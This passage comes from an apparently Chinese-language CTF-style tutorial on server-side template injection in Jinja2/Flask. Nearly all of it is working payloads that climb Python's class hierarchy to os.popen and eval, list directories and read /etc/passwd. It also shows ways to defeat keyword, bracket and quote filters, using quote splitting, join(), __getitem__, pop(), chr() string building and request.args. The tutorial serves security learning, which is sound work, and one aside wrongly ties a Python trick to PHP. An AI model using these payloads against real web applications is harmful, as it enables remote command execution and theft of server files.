<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">59</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;__builtins__&#39;</span>][<span style="color:#a6be9d">&#39;eval&#39;</span>](<span style="color:#a6be9d">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span>)}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">77</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;os&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">popen</span>(<span style="color:#a6be9d">&#39;ls /&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}</span></span></code></pre></div><h3 id="利用引号绕过" class="heading-element"><span>利用引号绕过</span>
  <a href="#%e5%88%a9%e7%94%a8%e5%bc%95%e5%8f%b7%e7%bb%95%e8%bf%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>我们可以利用引号来绕过对关键字的过滤。例如，过滤了flag，那么我们可以用 <code>fl&quot;&quot;ag</code> 或 <code>fl''ag</code> 的形式来绕过：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">40</span>](<span style="color:#a6be9d">&#34;/fl&#34;&#34;ag&#34;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()</span></span></code></pre></div><p>再如：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">77</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;o&#39;&#39;s&#39;</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">popen</span>(<span style="color:#a6be9d">&#39;ls&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">59</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;__buil&#39;&#39;tins__&#39;</span>][<span style="color:#a6be9d">&#39;eval&#39;</span>](<span style="color:#a6be9d">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span>)}}</span></span></code></pre></div><p>可以看到，在payload中，只要是字符串的，即payload中引号内的，都可以用引号绕过</p>
<h3 id="利用join函数绕过" class="heading-element"><span>利用join()函数绕过</span>
  <a href="#%e5%88%a9%e7%94%a8join%e5%87%bd%e6%95%b0%e7%bb%95%e8%bf%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>们可以利用join()函数来绕过关键字过滤。例如，题目过滤了flag，那么我们可以用如下方法绕过：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__base__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">40</span>](<span style="color:#a6be9d">&#34;fla&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">join</span>(<span style="color:#a6be9d">&#34;/g&#34;</span>))<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()</span></span></code></pre></div><p>这也是基于对PHP函数命令的理解来的。</p>
<h2 id="绕过其他字符" class="heading-element"><span>绕过其他字符</span>
  <a href="#%e7%bb%95%e8%bf%87%e5%85%b6%e4%bb%96%e5%ad%97%e7%ac%a6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="过滤了中括号-" class="heading-element"><span>过滤了中括号[ ]</span>
  <a href="#%e8%bf%87%e6%bb%a4%e4%ba%86%e4%b8%ad%e6%8b%ac%e5%8f%b7-" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 id="利用-__getitem__-绕过" class="heading-element"><span><strong>利用 <code>__getitem__()</code> 绕过</strong></span>
  <a href="#%e5%88%a9%e7%94%a8-__getitem__-%e7%bb%95%e8%bf%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>可以使用 <code>__getitem__()</code> 方法<strong>输出序列属性中的某个索引处的元素</strong>(相当于<code>[]</code>)，如：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">&gt;&gt;&gt;</span> <span style="color:#a6be9d">&#34;&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__mro__</span>[<span style="color:#a6be9d">2</span>]
</span></span><span style="display:flex;"><span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">type</span> <span style="color:#a6be9d">&#39;object&#39;</span><span style="color:#ff636f">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">&gt;&gt;&gt;</span> <span style="color:#a6be9d">&#34;&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__mro__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__getitem__</span>(<span style="color:#a6be9d">2</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">type</span> <span style="color:#a6be9d">&#39;object&#39;</span><span style="color:#ff636f">&gt;</span></span></span></code></pre></div><p>如下示例：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#a6be9d">&#39;&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__mro__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__getitem__</span>(<span style="color:#a6be9d">2</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__getitem__</span>(<span style="color:#a6be9d">40</span>)(<span style="color:#a6be9d">&#39;/etc/passwd&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}       <span style="color:#ff636f">//</span> <span style="color:#58a1dd">指定序列属性</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__getitem__</span>(<span style="color:#a6be9d">0</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__getitem__</span>(<span style="color:#a6be9d">59</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__getitem__</span>(<span style="color:#a6be9d">&#39;__builtins__&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">__getitem__</span>(<span style="color:#a6be9d">&#39;eval&#39;</span>)(<span style="color:#a6be9d">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span>)}}       <span style="color:#ff636f">//</span> <span style="color:#58a1dd">指定字典属性</span></span></span></code></pre></div><h4 id="利用-pop-绕过" class="heading-element"><span><strong>利用 pop() 绕过</strong></span>
  <a href="#%e5%88%a9%e7%94%a8-pop-%e7%bb%95%e8%bf%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p><code>pop()方法</code>可以返回指定序列属性中的某个索引处的元素或指定字典属性中某个键对应的值，用法和上面的<code>__getitem__()</code>基本一样，如下示例：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#a6be9d">&#39;&#39;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__mro__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__getitem__</span>(<span style="color:#a6be9d">2</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">40</span>)(<span style="color:#a6be9d">&#39;/etc/passwd&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}       <span style="color:#ff636f">//</span> <span style="color:#58a1dd">指定序列属性</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__getitem__</span>(<span style="color:#a6be9d">0</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">59</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">&#39;__builtins__&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">&#39;eval&#39;</span>)(<span style="color:#a6be9d">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span>)}}       <span style="color:#ff636f">//</span> <span style="color:#58a1dd">指定字典属性</span></span></span></code></pre></div><p><strong>注意：最好不要用pop()，因为pop()会删除相应位置的值。</strong></p>
<h4 id="利用字典读取绕过" class="heading-element"><span><strong>利用字典读取绕过</strong></span>
  <a href="#%e5%88%a9%e7%94%a8%e5%ad%97%e5%85%b8%e8%af%bb%e5%8f%96%e7%bb%95%e8%bf%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>我们知道<strong>访问字典里的值有两种方法</strong>，一种是把相应的键放入我们熟悉的方括号 <code>[]</code> 里来访问，另一种就是用点 <code>.</code> 来访问。所以，当方括号 <code>[]</code> 被过滤之后，我们还可以用点 <code>.</code> 的方式来访问，如下示例</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#改成 __builtins__.eval()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__getitem__</span>(<span style="color:#a6be9d">0</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">59</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__builtins__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">eval</span>(<span style="color:#a6be9d">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span>)}}</span></span></code></pre></div><p>等同于：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">59</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span>[<span style="color:#a6be9d">&#39;__builtins__&#39;</span>][<span style="color:#a6be9d">&#39;eval&#39;</span>](<span style="color:#a6be9d">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span>)}} </span></span></code></pre></div><h3 id="过滤了引号" class="heading-element"><span>过滤了引号</span>
  <a href="#%e8%bf%87%e6%bb%a4%e4%ba%86%e5%bc%95%e5%8f%b7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 id="利用chr绕过" class="heading-element"><span><strong>利用chr()绕过</strong></span>
  <a href="#%e5%88%a9%e7%94%a8chr%e7%bb%95%e8%bf%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>先获取<code>chr()</code>函数，赋值给chr，后面再拼接成一个字符串</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">chr</span><span style="color:#ff636f">=</span>()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()[<span style="color:#a6be9d">59</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__builtins__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">chr</span><span style="color:#ff636f">%</span>}{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span><span style="color:#ff636f">.</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">40</span>)(<span style="color:#58a1dd">chr</span>(<span style="color:#a6be9d">47</span>)<span style="color:#ff636f">+</span><span style="color:#58a1dd">chr</span>(<span style="color:#a6be9d">101</span>)<span style="color:#ff636f">+</span><span style="color:#58a1dd">chr</span>(<span style="color:#a6be9d">116</span>)<span style="color:#ff636f">+</span><span style="color:#58a1dd">chr</span>(<span style="color:#a6be9d">99</span>)<span style="color:#ff636f">+</span><span style="color:#58a1dd">chr</span>(<span style="color:#a6be9d">47</span>)<span style="color:#ff636f">+</span><span style="color:#58a1dd">chr</span>(<span style="color:#a6be9d">112</span>)<span style="color:#ff636f">+</span><span style="color:#58a1dd">chr</span>(<span style="color:#a6be9d">97</span>)<span style="color:#ff636f">+</span><span style="color:#58a1dd">chr</span>(<span style="color:#a6be9d">115</span>)<span style="color:#ff636f">+</span><span style="color:#58a1dd">chr</span>(<span style="color:#a6be9d">115</span>)<span style="color:#ff636f">+</span><span style="color:#58a1dd">chr</span>(<span style="color:#a6be9d">119</span>)<span style="color:#ff636f">+</span><span style="color:#58a1dd">chr</span>(<span style="color:#a6be9d">100</span>))<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}</span></span></span></code></pre></div><p>等同于：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">40</span>)(<span style="color:#a6be9d">&#39;/etc/passwd&#39;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}</span></span></code></pre></div><h4 id="利用request对象绕过" class="heading-element"><span><strong>利用request对象绕过</strong></span>
  <a href="#%e5%88%a9%e7%94%a8request%e5%af%b9%e8%b1%a1%e7%bb%95%e8%bf%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{()<span style="color:#ff636f">.</span><span style="color:#58a1dd">__class__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__bases__</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">.</span><span style="color:#58a1dd">__subclasses__</span>()<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">40</span>)(<span style="color:#58a1dd">request</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">args</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">path</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">read</span>()}}<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">path</span><span style="color:#ff636f">=/</span><span style="color:#58a1dd">etc</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">passwd</span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#像下面这样就可以直接利用了</span>
